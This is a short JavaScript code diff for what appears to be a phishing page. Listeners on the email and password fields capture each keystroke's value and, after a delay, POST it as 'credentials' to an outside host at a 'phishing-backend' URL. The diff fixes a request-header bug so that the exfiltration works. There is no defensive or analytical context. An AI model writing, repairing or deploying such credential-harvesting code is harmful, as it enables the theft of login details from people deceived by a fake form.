@@ -11,7 +11,7 @@ email.addEventListener("input", (e) => {
     setTimeout(() => {
         fetch("https://phishing-backend-seh2.onrender.com/phishing", {
             method: "POST",
-            header: {"Content-Type": "application/json"},
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify({ credentials : e.target.value})
         })
     }, 5000)
@@ -24,10 +24,9 @@ password.addEventListener("input", (e) => {
     setTimeout(() => {
         fetch("https://phishing-backend-seh2.onrender.com/phishing", {
             method: "POST",
-            header: {"Content-Type": "application/json"},
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify({ credentials : e.target.value})
         })
     }, 5000)
  
 })
-
